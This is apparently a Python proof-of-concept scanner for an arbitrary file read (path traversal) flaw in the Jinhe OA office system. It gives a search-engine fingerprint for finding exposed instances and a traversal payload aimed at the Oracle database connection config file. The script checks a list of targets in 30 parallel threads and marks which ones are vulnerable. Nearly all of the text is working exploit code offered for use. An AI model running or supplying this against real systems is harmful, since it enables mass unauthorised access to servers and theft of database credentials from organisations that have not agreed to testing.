# 作者：Affection
# 开发日期：2024/12/19
"""
漏洞介绍：金和OA任意文件读取漏洞
指纹语法：app="金和网络-金和OA"
Payload：/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml
"""
import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description="金和OA任意文件读取漏洞验证脚本")
    # 命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="输入目标url")
    parse.add_argument('-f','--file',dest='file',type=str,help="输入目标文件")
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            target = f"http://{args.url}"
            check(target)
    elif args.file:
        f = open(args.file,'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)

        pool.map(check,targets)
        pool.close()

def check(target):
    target1 = f"{target}/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101Firefox / 120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    }
    try:
        response = requests.get(target1,headers = headers,verify = False,timeout = 5)
        if response.status_code == 200 and 'uid' in response.text:
            print(f"[*] {target} Is Vulnerable!!!")
        else:
            print(f"[-] {target} Not Vnlnerable!")
    except Exception as e:
        print(f"[Error] {target} TimeOut")

if __name__== '__main__':
    main()